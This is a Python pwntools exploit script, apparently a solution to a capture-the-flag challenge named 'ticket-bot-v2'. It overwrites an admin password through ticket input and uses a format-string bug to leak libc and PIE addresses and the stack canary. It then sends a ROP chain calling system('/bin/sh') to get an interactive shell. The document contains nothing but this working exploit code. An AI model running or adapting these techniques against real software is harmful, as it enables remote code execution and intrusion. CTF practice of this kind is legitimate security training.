from pwn import *

gs = '''
continue
'''

elf = context.binary = ELF("./chal_patched")
libc = ELF("./libc.so.6")

def start():
    if args.REMOTE:
        return remote("ticket-bot-v2.challs.csc.tf", 1337)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']

def new_ticket(data):
    io.sendlineafter("========================", b"1")
    io.sendlineafter("Please tell me why your here:\n", data)

def login(password=0x0000000042420000):
    io.sendlineafter("========================", b"3")
    io.sendlineafter("Admin Password\n", str(0x0000000042420000).encode())

def leak_address(pos):
    login()

    io.sendlineafter("========================\n", b"1")

    io.sendlineafter("Enter new Password\n", f"%{pos}$p")

    io.recvuntil("Password changed to\n")

    return io.recvline().strip().decode().replace("========================", "")

io = start()

io.sendlineafter("Please tell me why your here:\n", b"A"*32)

new_ticket(b"A"*32)
new_ticket(b"A"*32)
new_ticket(b"A"*32)
new_ticket(b"A"*32)

new_ticket(b"\x00\x00\x00\x00\x00\x00\x42\x42")

for i in range(1, 10):
    print(leak_address(i))

leak_libc = int(leak_address(1), 16)

libc.address = (leak_libc - 131) - libc.sym._IO_2_1_stdout_

leak_pie = int(leak_address(9), 16)

elf.address = leak_pie - 5798

canary = int(leak_address(7), 16)

print(f"[+] System: {hex(libc.sym.system)}")
print(f"[+] AdminMenu: {hex(elf.sym.AdminMenu)}")
print(f"[+] Canary: {hex(canary)}")

rop = ROP(libc)

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

payload = b"".join([
    b"A"*(8),
    p64(canary),
    b"B"*8,
    p64(pop_rdi),
    p64(next(libc.search(b"/bin/sh\x00"))),
    p64(ret),
    p64(libc.sym.system)
])

login()

io.sendlineafter("========================\n", b"1")
#input("PAUSE")
io.sendlineafter("Enter new Password\n", payload)

io.interactive()
